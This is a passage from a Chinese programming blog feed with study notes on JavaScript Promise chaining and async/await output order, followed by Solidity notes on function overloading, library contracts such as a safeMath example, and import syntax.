289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(969,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>1st Resolved.</code></p><p>改成 <code>setTimeout(rejected, ms)</code>：<code>World Ender</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="2.883ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1274.2 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(274.2,0)"></path><svg width="374.2" height="865" x="0" y="-182" viewBox="93.6 -182 374.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(0.721,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(969,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>1st Rejected.</code></p><p>我们可以在函数中再返回一次 <code>promiseWithSetTimeout()</code>，实现 <code>Promise</code> 的链式调用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Js"><span class="hljs-title function_">promiseWithSetTimeout</span>(<span class="hljs-number">1000</span>)<br>.<span class="hljs-title function_">then</span>( <span class="hljs-function">() =&gt;</span> {<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1st Resolved."</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">promiseWithSetTimeout</span>(<span class="hljs-number">2000</span>);<br>} )<br>.<span class="hljs-title function_">then</span>( <span class="hljs-function">() =&gt;</span> {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"2nd Resolved."</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">"More."</span>);<br>} )<br>.<span class="hljs-title function_">then</span>( <span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res + <span class="hljs-string">" 3rd Resolved."</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">"No more."</span>);<br>} )<br>.<span class="hljs-title function_">catch</span>( <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value + <span class="hljs-string">" Finally Rejected."</span>);<br>} )<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"World Ender"</span>);<br></code></pre></td></tr></table></figure><p>输出：<code>World Ender</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="2.883ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1274.2 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(274.2,0)"></path><svg width="374.2" height="865" x="0" y="-182" viewBox="93.6 -182 374.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(0.721,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(969,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>1st Resolved.</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="2.883ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1274.2 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(274.2,0)"></path><svg width="374.2" height="865" x="0" y="-182" viewBox="93.6 -182 374.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(0.721,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(969,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>2nd Resolved.</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.532ex" height="3.262ex" role="img" focusable="false" viewBox="0 -1359.7 2003.2 1441.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(1003.2,0)"></path><svg width="1103.2" height="865" x="0" y="-182" viewBox="275.8 -182 1103.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(2.127,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">立</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">刻</text></g><g data-mml-node="mspace" transform="translate(2000,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>More. 3rd Resolved.</code> <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.532ex" height="3.262ex" role="img" focusable="false" viewBox="0 -1359.7 2003.2 1441.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(1003.2,0)"></path><svg width="1103.2" height="865" x="0" y="-182" viewBox="275.8 -182 1103.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(2.127,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">立</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">刻</text></g><g data-mml-node="mspace" transform="translate(2000,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>No more. Finally Rejected.</code></p><h3 id="Async-Await"><a href="#Async-Await" class="headerlink" title="Async / Await"></a><code>Async / Await</code></h3><p>在 <code>function</code> 前加上 <code>async</code>，函数会变为异步函数，返回值被自动包装为 <code>Promise</code> 对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span> (<span class="hljs-params"></span>) {<br><span class="hljs-keyword">return</span> <span class="hljs-number">42</span>;<br>}<br><span class="hljs-keyword">const</span> tmp = <span class="hljs-title function_">test</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tmp);<span class="hljs-comment">// Promise { 42 }</span><br></code></pre></td></tr></table></figure><p><code>await</code> <strong>只能在 <code>async</code> 函数内</strong>工作，后面一般跟一个 <code>Promise</code> 对象，效果为等待，直到 <code>Promise</code> 完成并返回结果。 </p><p>在 <code>await</code> 造成的等待中，<code>async</code> 函数内会暂停等待 <code>Promise</code> 对象的反应，但函数外的程序仍会正常进行。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">promiseWithSetTimeout</span>(<span class="hljs-params">ms</span>) {<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>( <span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {<br><span class="hljs-built_in">setTimeout</span>( resolve, ms );<br>} );<br>}<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span> (<span class="hljs-params"></span>) {<br><span class="hljs-keyword">return</span> <span class="hljs-number">42</span>;<br>}<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"></span>) {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Let's start!"</span>);<br><span class="hljs-keyword">await</span> <span class="hljs-title function_">promiseWithSetTimeout</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Stop running."</span>);<br>}<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run2</span>(<span class="hljs-params"></span>) {<br>    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">test</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);<br>}<br><br><span class="hljs-title function_">run</span>();<br><span class="hljs-title function_">run2</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"World Ender"</span>);<br></code></pre></td></tr></table></figure><p>输出：<code>Let's start!</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.532ex" height="3.262ex" role="img" focusable="false" viewBox="0 -1359.7 2003.2 1441.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(1003.2,0)"></path><svg width="1103.2" height="865" x="0" y="-182" viewBox="275.8 -182 1103.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(2.127,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">立</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">刻</text></g><g data-mml-node="mspace" transform="translate(2000,0)"></g></g></g></g></g></g></svg></mjx-container>   <code>World Ender</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.532ex" height="3.262ex" role="img" focusable="false" viewBox="0 -1359.7 2003.2 1441.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(1003.2,0)"></path><svg width="1103.2" height="865" x="0" y="-182" viewBox="275.8 -182 1103.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(2.127,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">立</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">刻</text></g><g data-mml-node="mspace" transform="translate(2000,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>42</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="2.883ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1274.2 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(274.2,0)"></path><svg width="374.2" height="865" x="0" y="-182" viewBox="93.6 -182 374.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(0.721,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(969,0)"></g></g></g></g></g></g></svg></mjx-container>  <code>Stop running.</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Solidity102笔记</title>
    <link href="/2024/12/08/Solidity102/"/>
    <url>/2024/12/08/Solidity102/</url>
    
    <content type="html"><![CDATA[<h2 id="15-重载"><a href="#15-重载" class="headerlink" title="15. 重载"></a>15. 重载</h2><ul><li><p>即名字相同但参数不同的函数可以同时存在，并被视为不同的函数。</p></li><li><p>修饰器 <strong>不能</strong> 重载</p></li><li>原理：函数选择器</li></ul><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function me() external pure returns(string memory) &#123;<br>return (&quot;victifa&quot;);<br>&#125;// 输出 &quot;victifa&quot;<br><br>function me(string memory _str) external pure returns(string memory) &#123;<br>return (_str);<br>&#125;// 输出 _str<br></code></pre></td></tr></table></figure><h3 id="实参匹配（Argument-Matching）"><a href="#实参匹配（Argument-Matching）" class="headerlink" title="实参匹配（Argument Matching）"></a>实参匹配（Argument Matching）</h3><p>在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function f(uint8 _in) public pure returns (uint8 out) &#123;<br>out = _in;<br>&#125;<br><br>function f(uint256 _in) public pure returns (uint256 out) &#123;<br>out = _in;<br>&#125;<br></code></pre></td></tr></table></figure><p>理论上，输入50调用函数应该会报错，但是，实际使用时发现出现报错的条件比较严苛：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Test &#123;<br>    function f(uint256 _in) external returns (uint256 out);<br>    function f(uint8 _in) external returns (uint256 out);<br>&#125;<br><br>contract test &#123;<br>    function f(uint8 _in) public pure returns (uint8 out) &#123;<br>        out = _in;<br>    &#125;<br><br>    function f(uint256 _in) public pure returns (uint256 out) &#123;<br>        out = _in;<br>    &#125;<br>&#125;<br><br>contract A &#123;<br>    function AA(address from) public returns(uint rs) &#123;<br>        rs = Test(from).f(50);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>仅在以上情况下，会在编译界面直接画红线报错。</p><p>以下是几种不会报错的情形：</p><ol><li><p>直接在部署栏调用函数 <code>f()</code></p></li><li><p>接口处仅有两个 <code>f()</code> 中的一个</p></li><li><p>使用参数输入50（如下）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract A &#123;<br>    function AA(address from, uint num) public returns(uint rs) &#123;<br>        rs = Test(from).f(num);<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="17-库合约"><a href="#17-库合约" class="headerlink" title="17. 库合约"></a>17. 库合约</h2><p>一种特殊的合约，是一系列函数的合集，有大佬制作，会用就行。</p><ul><li><p>你如果是大佬，就要知道：</p><ul><li><p>与普通合约区别：</p><ol><li><p>没有状态变量</p></li><li><p>不能继承或被继承</p></li><li><p>不能接受以太币</p></li><li><p>不能被销毁</p></li></ol></li><li><p>函数设置为 <code>public</code> 或 <code>external</code>，调用时会触发 <code>delegatecall</code>，<code>internal</code> 时无事发生，<code>private</code> 则仅在在库合约中可见</p></li></ul></li></ul><h3 id="Strings库合约"><a href="#Strings库合约" class="headerlink" title="Strings库合约"></a>Strings库合约</h3><p>主要包含两个函数：</p><ol><li><code>toString()</code> 将 <code>uint256</code> 转为<code>string</code></li><li><code>toHexString</code> 将 <code>uint256</code> 转为 16进制 再转为<code>string</code></li></ol><h3 id="使用库合约"><a href="#使用库合约" class="headerlink" title="使用库合约"></a>使用库合约</h3><p>假设我们定义了如下库合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">library safeMath&#123;<br>    function add(uint a, uint b) public pure returns(uint256) &#123;<br>uint256 c = a + b;<br>        assert(c &gt;= a);<br>        return c;<br>&#125;<br><br>function sub(uint256 a, uint256 b) public pure returns (uint256) &#123;<br>    assert(b &lt;= a);<br>    return a - b;<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p>调用该库合约的方法有以下两种：</p><ol><li><p><code>using A for B</code></p><p>附加库合约(A)到任意类型(B)，库 A 中的函数会自动添加 B 类型的变量成员，直接调用，这个变量作为第一个变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">using safeMath for uint256;<br>contract libraryUsage &#123;<br>    function usingTest(uint256 _num1, uint256 _num2) external pure returns(uint256)&#123;<br>        return _num1.add(_num2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，通过 <code>using safeMath for uint256;</code>，就相当于我们有了以下语句（假设我们已经定义了 <code>uint256</code> 类型的变量 a 和 b）：</p><ul><li><code>a.add(第二个参数);</code>，<code>b.add(第二个参数);</code></li><li><code>a.sub(第二个参数);</code>，<code>b.sub(第二个参数);</code></li></ul></li><li><p>直接调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function directlyUse (uint256 _num1, uint256 _num2) external pure returns(uint256)&#123;<br>return safeMath.sub(_num1, _num2);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="18-Import"><a href="#18-Import" class="headerlink" title="18. Import"></a>18. Import</h2><ol><li><p>本地相对位置引入，如引入10中冒泡排序： <code>import &#39;./bubbleSort.sol&#39;;</code></p></li><li><p>通过网址导入 </p><p><code>import &#39;https://github.com/OpenZeppelin/openzeppelincontracts/blob/master/contracts/utils/Address.sol&#39;;</code></p></li><li><p>通过 npm 导入 <code>*import* &#39;@openzeppelin/contracts/access/Ownable.sol&#39;;</code></p></li><li><p>仅导入本地某个特定的合约 <code>import &#123;Sort&#125; from &#39;./bubbleSort.sol&#39;;</code></p></li></ol><ul><li>位置：版本号后，其余代码前</li><li><strong>注意：</strong>==本地合约名字不能有中文！！！==</li></ul><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 